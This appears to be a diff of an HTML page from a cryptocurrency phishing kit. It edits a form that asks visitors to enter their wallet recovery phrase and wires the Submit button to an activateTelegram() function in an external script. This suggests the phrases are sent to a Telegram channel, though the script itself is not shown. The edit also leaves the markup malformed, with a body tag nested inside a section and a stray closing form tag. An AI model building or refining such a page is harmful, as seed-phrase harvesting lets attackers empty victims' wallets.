@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -301,11 +302,20 @@
         </nav>
     </header>
 
-    <section class="recovery-box">
-    <h2>Enter Your Recovery Phrase</h2>
-    <form id="recovery-form">
+    <body>
+
+    
+        <p>Enter your recovery phrase below:</p>
         <input type="text" id="recovery-phrase" placeholder="Enter recovery phrase">
-        <button type="submit">Connect Wallet</button>
+        <button onclick="activateTelegram()">Submit</button>
+        
+        <!-- بارگذاری فایل جاوا اسکریپت -->
+        <script src="/js/script.js"></script>
+    </body>
+
+
+
+
     </form>
 
     <div id="telegram-section" class="telegram-section" style="display: none;">
